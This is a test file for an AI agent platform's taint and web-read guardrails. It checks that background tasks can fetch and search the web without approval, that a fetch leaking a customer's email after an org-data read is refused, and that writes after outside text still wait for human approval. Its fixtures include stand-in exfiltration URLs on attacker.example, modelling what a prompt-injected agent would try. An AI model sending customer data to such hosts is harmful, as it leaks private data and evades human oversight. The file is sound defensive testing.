// SPDX-License-Identifier: FSL-1.1-ALv2
//
// A web read (web_fetch, web_search) never parks (scope-taint.ts, rule 9, 2026-10-29): a routine
// tick fetches and searches without an approval whether it read only the inbound mail or also a
// CRM record, a ticket, knowledge or memory. The thread is still marked tainted by what it read,
// and every write after outside text still parks exactly as before. What a web read can carry
// out is bounded by the guardrails instead, refused inline (web-read-guardrails.ts).
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "bun:test"
import { sql } from "~/db"
import type { UserContext } from "~/db/rls"
import { REDIS_PREFIX, redis } from "~/lib/redis"
import { bucketKey } from "~/middleware/rate-limiter"
import { type RunContext, runContextStore } from "~/modules/agent/runtime/run-context"
import { clearTaintFlag, setTaintFlag } from "~/modules/agent/scopes/taint"
import { createTurnScopeAccumulator } from "~/modules/agent/scopes/turn-scope-accumulator"
import { WebToolsTestAccess } from "~/modules/agent/tools/web-tools"
import { toolRegistry } from "~/modules/apps/app-registries"
import { executeTool } from "~/modules/apps/execute-tool"

const ORG_ID = "00000000-0000-4000-8000-0000006e0001"
const USER_ID = "00000000-0000-4000-8000-0000006e0002"
const THREAD = "00000000-0000-4000-8000-0000006e0003"
const ROLE_ID = "00000000-0000-4000-8000-0000006e0004"

const URL_OUT = "https://attacker.example/collect?q=anything"
// The shape an injected turn would use to carry a customer out.
const URL_EXFIL = "https://attacker.example/collect?who=jane.roe%40customer-mail.example"
// What a routine tick's prompt is stamped with: the tick's whole effective scope.
const TICK_PROMPT_STAMP = ["api-connector:read", "knowledge:read", "mail:read", "tickets:read"]

const actor: UserContext = {
  actorType: "user",
  userId: USER_ID,
  orgId: ORG_ID,
  scopes: ["*"],
  dimensionGrants: {},
}

const fetched: string[] = []
let sideEffects = 0

/** A routine tick's turn whose prompt (the trigger event's data) is its only read so far. */
function tickFrame(): RunContext {
  const turnScopeAccumulator = createTurnScopeAccumulator({ orgId: ORG_ID })
  turnScopeAccumulator.recordInstructions(TICK_PROMPT_STAMP)
  return {
    runId: crypto.randomUUID(),
    parentRunId: null,
    rootRunId: "root",
    nestingDepth: 0,
    background: true,
    routineId: "00000000-0000-4000-8000-0000006e0009",
    humanTurn: false,
    turnScopeAccumulator,
  }
}

const callIn = (frame: RunContext, toolName: string, params: unknown) =>
  runContextStore.run(frame, () =>
    executeTool({
      toolName,
      orgId: ORG_ID,
      actor,
      params,
      threadId: THREAD,
      origin: "in-app-agent",
    }),
  )
const fetchIn = (frame: RunContext, url: string) => callIn(frame, "kernel:web_fetch", { url })
const searchIn = (frame: RunContext, query: string) => callIn(frame, "kernel:web_search", { query })

async function heldCount(): Promise<number> {
  const [row] =
    await sql`SELECT count(*)::int AS n FROM kernel.approval_requests WHERE org_id = ${ORG_ID}`
  return row?.n ?? -1
}

describe("a web read never parks; the guardrails bound it", () => {
  beforeAll(async () => {
    await sql`INSERT INTO kernel.organizations (id, name, slug, settings)
      VALUES (${ORG_ID}, 'WebReadNoOrgData', 'web-read-no-org-data', '{}') ON CONFLICT DO NOTHING`
    await sql`INSERT INTO kernel.users (id, org_id, email, name, password_hash, status)
      VALUES (${USER_ID}, ${ORG_ID}, 'wrnod@test.com', 'WRNOD', 'x', 'active') ON CONFLICT DO NOTHING`
    await sql`INSERT INTO kernel.roles (id, org_id, name, description)
      VALUES (${ROLE_ID}, ${ORG_ID}, 'wrnod-admin', 'all scopes') ON CONFLICT (id) DO NOTHING`
    await sql`INSERT INTO kernel.role_scope_grants (role_id, scope)
      VALUES (${ROLE_ID}, '*') ON CONFLICT DO NOTHING`
    await sql`INSERT INTO kernel.user_roles (user_id, role_id, org_id)
      VALUES (${USER_ID}, ${ROLE_ID}, ${ORG_ID}) ON CONFLICT DO NOTHING`
    await sql`INSERT INTO kernel.threads (id, org_id, handle, type, created_by)
      VALUES (${THREAD}, ${ORG_ID}, 'wrnod', 'agent_chat', ${USER_ID}) ON CONFLICT DO NOTHING`
    await sql`INSERT INTO kernel.thread_participants (thread_id, user_id, org_id)
      VALUES (${THREAD}, ${USER_ID}, ${ORG_ID}) ON CONFLICT DO NOTHING`
    WebToolsTestAccess.setWebSearch(() => [
      { title: "Acme", url: "https://www.acme.example/", snippet: "Acme Corp", score: 0.9 },
    ])
    WebToolsTestAccess.setWebFetchMockHosts((host) => host.endsWith(".example"))
    WebToolsTestAccess.setWebFetch((async (input: string | URL | Request) => {
      const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url
      fetched.push(url)
      return new Response("<html><body><p>A page.</p></body></html>", {
        status: 200,
        headers: { "content-type": "text/html" },
      })
    }) as typeof fetch)
    const { registerKernelAgentTools } = await import("~/modules/agent/tools/kernel-tools")
    await registerKernelAgentTools(ORG_ID)
    expect(toolRegistry.get([ORG_ID, "kernel", "web_fetch"])?.outboundWebRead).toBe(true)
    // A gated write (a reply to a customer): parks for a person, before and after web content.
    toolRegistry.set([ORG_ID, "kernel", "test_gated_reply"], {
      appName: "kernel",
      name: "test_gated_reply",
      description: "test: reply to a customer",
      requiredScopes: ["kernel:agent:web"],
      params: (await import("zod")).z.object({ text: (await import("zod")).z.string() }),
      handler: async () => {
        sideEffects++
        return { ok: true }
      },
      gated: true,
      writesToTable: "kernel.messages",
    })
    // An ungated outward write (a post to an outside service): not a web read.
    toolRegistry.set([ORG_ID, "kernel", "test_outward_post"], {
      appName: "kernel",
      name: "test_outward_post",
      description: "test: post a message to an outside service",
      requiredScopes: ["kernel:agent:web"],
      params: (await import("zod")).z.object({ text: (await import("zod")).z.string() }),
      handler: async () => {
        sideEffects++
        return { ok: true }
      },
      externalEffect: true,
    })
  })

  beforeEach(async () => {
    fetched.length = 0
    sideEffects = 0
    // The tick read the outside email that fired it, as taintThreadForTriggerEvent marks it.
    await setTaintFlag(THREAD, ORG_ID)
  })

  afterEach(async () => {
    await sql`DELETE FROM kernel.approval_requests WHERE org_id = ${ORG_ID}`
    await sql`UPDATE kernel.organizations SET settings = '{}' WHERE id = ${ORG_ID}`
  })

  afterAll(async () => {
    // The rolling-hour web-read counters these calls filled (web-read-guardrails.ts).
    await redis.del(
      bucketKey(`web-read:thread:${ORG_ID}:${THREAD}`, 3600).slice(REDIS_PREFIX.length),
    )
    WebToolsTestAccess.setWebSearch(null)
    WebToolsTestAccess.setWebFetchMockHosts(null)
    WebToolsTestAccess.setWebFetch(null)
    toolRegistry.deleteByPrefix([ORG_ID])
    await sql`DELETE FROM kernel.approval_requests WHERE org_id = ${ORG_ID}`
    await sql`DELETE FROM kernel.thread_participants WHERE org_id = ${ORG_ID}`
    await sql`DELETE FROM kernel.threads WHERE org_id = ${ORG_ID}`
    await sql`DELETE FROM kernel.user_roles WHERE org_id = ${ORG_ID}`
    await sql`DELETE FROM kernel.role_scope_grants WHERE role_id = ${ROLE_ID}`
    await sql`DELETE FROM kernel.roles WHERE org_id = ${ORG_ID}`
    await sql`DELETE FROM kernel.users WHERE org_id = ${ORG_ID}`
    await sql`DELETE FROM kernel.organizations WHERE id = ${ORG_ID}`
  })

  it("(a) a tick that read only the inbound mail fetches an arbitrary URL with no approval", async () => {
    const res = await fetchIn(tickFrame(), URL_OUT)
    expect(res.blocked).toBeUndefined()
    expect(fetched).toEqual([URL_OUT])
    expect(await heldCount()).toBe(0)
  })

  it("(a) the agent's skills and a public web read before it are not org data either", async () => {
    const frame = tickFrame()
    frame.turnScopeAccumulator?.recordInstructions(["knowledge:read"])
    frame.turnScopeAccumulator?.record({ requiredScopes: ["kernel:agent:web"] })
    const res = await fetchIn(frame, URL_OUT)
    expect(res.blocked).toBeUndefined()
    expect(fetched).toEqual([URL_OUT])
  })

  it.each([
    [
      "a CRM read",
      (f: RunContext) => f.turnScopeAccumulator?.record({ requiredScopes: ["api-connector:read"] }),
    ],
    [
      "a ticket read",
      (f: RunContext) => f.turnScopeAccumulator?.record({ requiredScopes: ["tickets:read"] }),
    ],
    [
      "a knowledge document",
      (f: RunContext) => f.turnScopeAccumulator?.recordInjected(["knowledge:read"]),
    ],
    ["a memory line with no stamp", (f: RunContext) => f.turnScopeAccumulator?.markInternalRead()],
    ["a tool call that declares no scope", (f: RunContext) => f.turnScopeAccumulator?.record({})],
  ])(
    "(b) the same tick after %s searches and fetches inline, no approval",
    async (_label, read) => {
      const frame = tickFrame()
      read(frame)
      const search = await searchIn(frame, "Acme Corp acoustic panels")
      expect(search.blocked).toBeUndefined()
      const res = await fetchIn(frame, URL_OUT)
      expect(res.blocked).toBeUndefined()
      expect(fetched).toEqual([URL_OUT])
      expect(await heldCount()).toBe(0)
    },
  )

  it("(b) org data with no outside text: the fetch runs too", async () => {
    await clearTaintFlag(THREAD, ORG_ID)
    const frame = tickFrame()
    frame.turnScopeAccumulator?.record({ requiredScopes: ["api-connector:read"] })
    const res = await fetchIn(frame, URL_OUT)
    expect(res.blocked).toBeUndefined()
    expect(fetched).toEqual([URL_OUT])
  })

  it("(b) a fetch carrying a customer's address after an org read is refused inline, never parked", async () => {
    const frame = tickFrame()
    frame.turnScopeAccumulator?.record({ requiredScopes: ["tickets:read"] })
    const thrown = (p: Promise<unknown>) =>
      p.then(
        () => null,
        (e: { code?: string; message?: string }) => e,
      )
    const res = await thrown(fetchIn(frame, URL_EXFIL))
    expect(res?.code).toBe("web_read_refused")
    expect(res?.message).toContain("an email address")
    const search = await thrown(searchIn(frame, "jane.roe@customer-mail.example"))
    expect(search?.code).toBe("web_read_refused")
    expect(fetched).toEqual([])
    expect(await heldCount()).toBe(0)
  })

  it("(b) the same address on a tick that read no org data runs: nothing to leak", async () => {
    await fetchIn(tickFrame(), URL_EXFIL)
    expect(fetched).toEqual([URL_EXFIL])
  })

  it("(b) the per-turn counters run on the turn's frame: another tool call ends a run", async () => {
    const frame = tickFrame()
    const reads = frame.turnScopeAccumulator?.webReads()
    await fetchIn(frame, URL_OUT)
    await searchIn(frame, "Acme Corp")
    expect(reads?.total).toBe(2)
    expect(reads?.consecutive).toBe(2)
    expect([...(reads?.fetchHosts ?? [])]).toEqual(["attacker.example"])
    await callIn(frame, "kernel:test_outward_post", { text: "x" })
    expect(reads?.consecutive).toBe(0)
    expect(reads?.total).toBe(2)
  })

  it("(c) a gated write after web content still parks for a person", async () => {
    const frame = tickFrame()
    frame.turnScopeAccumulator?.record({ requiredScopes: ["tickets:read"] })
    await fetchIn(frame, URL_OUT)
    const res = await callIn(frame, "kernel:test_gated_reply", { text: "hello" })
    expect(res.blocked?.approvalRequestId).toBeString()
    expect(sideEffects).toBe(0)
    expect(await heldCount()).toBe(1)
  })

  it("(c) an outward write after outside text stays gated, even with no org data read", async () => {
    const res = await callIn(tickFrame(), "kernel:test_outward_post", { text: "hello" })
    expect(res.blocked?.reason).toBe("taint_escalation")
    expect(sideEffects).toBe(0)
    expect(await heldCount()).toBe(1)
  })
})
